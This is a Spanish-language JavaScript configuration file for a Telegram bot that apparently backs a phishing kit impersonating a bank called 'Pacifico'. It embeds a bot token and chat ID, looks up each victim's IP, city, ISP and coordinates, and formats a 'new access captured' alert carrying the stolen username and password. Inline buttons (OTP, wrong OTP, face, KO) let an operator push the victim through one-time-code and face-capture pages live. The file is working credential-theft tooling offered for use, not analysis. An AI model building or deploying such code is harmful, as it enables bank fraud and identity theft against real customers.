// ═══════════════════════════════════════════════
//  confi.js — Configuración del bot de Telegram
// ═══════════════════════════════════════════════

const CONFIG = {

  // ── Credenciales del bot ──────────────────────
  BOT_TOKEN: "7945542556:AAGAeGTHrE0i0YTCWqL4FxlwyWT_urry51M",
  CHAT_ID:   "5452961674",

  // ── URL base del sitio ────────────────────────
  SITE_URL: "https://tusitio.com",

  // ── Página de espera ─────────────────────────
  REDIRECT_URL: "wait.html",

  // ── Obtiene IP + geolocalización precisa ──────
  async getGeoData() {
    try {
      // ipapi.co da ciudad, región, país, ISP, coordenadas — gratis sin API key
      const res  = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      return {
        ip:      data.ip       || "N/A",
        ciudad:  data.city     || "N/A",
        region:  data.region   || "N/A",
        pais:    data.country_name || "N/A",
        isp:     data.org      || "N/A",
        lat:     data.latitude  || "",
        lon:     data.longitude || ""
      };
    } catch (_) {
      return { ip: "N/A", ciudad: "N/A", region: "N/A", pais: "N/A", isp: "N/A", lat: "", lon: "" };
    }
  },

  // ── Botones inline ────────────────────────────
  buildKeyboard(sessionId) {
    return {
      inline_keyboard: [
        [
          { text: "⏳ Cargando",       callback_data: `cargando|${sessionId}` },
          { text: "😊 Cara",           callback_data: `cara|${sessionId}` }
        ],
        [
          { text: "🔐 OTP",            callback_data: `otp|${sessionId}` },
          { text: "❌ OTP Incorrecto", callback_data: `otp_incorrecto|${sessionId}` }
        ],
        [
          { text: "🚫 KO",             callback_data: `ko|${sessionId}` }
        ]
      ]
    };
  },

  // ── Plantilla del mensaje ─────────────────────
  buildMessage(usuario, clave, geo) {
    return (
      `╔═══════════════════════╗\n` +
      `   🏦 *Pacifico - BR0K3N*\n` +
      `╚═══════════════════════╝\n` +
      `\n` +
      `🟢 *NUEVO ACCESO CAPTURADO*\n` +
      `\n` +
      `┌─────────────────────────\n` +
      `│ 👤 *Usuario*\n` +
      `│ \`${usuario}\`\n` +
      `│\n` +
      `│ 🔑 *Clave*\n` +
      `│ \`${clave}\`\n` +
      `└─────────────────────────\n` +
      `\n` +
      `┌─────────────────────────\n` +
      `│ 🌐 *IP:* \`${geo.ip}\`\n` +
      `│ 🏙️ *Ciudad:* ${geo.ciudad}\n` +
      `│ 🗺️ *Región:* ${geo.region}\n` +
      `│ 🌍 *País:* ${geo.pais}\n` +
      `│ 📡 *ISP:* ${geo.isp}\n` +
      `└─────────────────────────\n` +
      `\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `⚡ _Selecciona una acción:_\n` +
      `\n` +
      `👤 @Brknshinexxx`
    );
  }

};